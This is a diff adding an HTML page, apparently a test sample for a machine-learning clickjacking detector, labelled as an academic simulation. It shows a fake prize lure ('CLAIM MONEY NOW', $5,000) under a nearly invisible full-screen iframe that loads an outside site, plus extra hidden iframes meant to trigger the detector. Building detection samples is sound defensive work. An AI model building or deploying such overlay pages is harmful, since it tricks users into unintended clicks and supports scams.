@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Aggressive Clickjacking Attack Simulation</title>
+    <style>
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            background: #111;
+        }
+
+        /* The DECEPTIVE UI - what the user sees */
+        .fake-page {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #ddd;
+            z-index: 1;
+        }
+
+        .win-box {
+            background: #222;
+            padding: 40px;
+            border-radius: 20px;
+            border: 2px solid #ed1c24;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(237, 28, 36, 0.3);
+        }
+
+        .btn {
+            background: #ed1c24;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 10px;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        /* The AGGRESSIVE ATTACK - High z-index, transparent iframes */
+        .attack-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            /* Invisible to human eye but there */
+            z-index: 999999;
+            /* Higher than everything */
+            pointer-events: auto;
+        }
+
+        /* Multiple iframes to increase feature count for ML */
+        .extra-layer {
+            position: fixed;
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            left: 10%;
+            z-index: 1000;
+            opacity: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="fake-page">
+        <div class="win-box">
+            <h1 style="font-size: 48px; color: #ed1c24;">CONGRATULATIONS!</h1>
+            <p style="font-size: 20px;">You've been selected as our 1,000,000th visitor.</p>
+            <p>Click below to transfer your prize money ($5,000 USD) to your account.</p>
+            <button class="btn">CLAIM MONEY NOW</button>
+        </div>
+    </div>
+
+    <!-- Main attack iframe covering the button area -->
+    <iframe class="attack-layer" src="https://navnee1h.github.io"></iframe>
+
+    <!-- Secondary structural anomalies to trigger ML -->
+    <iframe class="extra-layer" src="about:blank"></iframe>
+    <iframe class="extra-layer" style="right: 10px; top: 10px;" src="about:blank"></iframe>
+
+    <div style="position: fixed; bottom: 10px; left: 10px; color: #444; font-size: 10px; z-index: 2;">
+        Academic Simulation: Aggressive Clickjacking Scenario
+    </div>
+</body>
+
+</html>
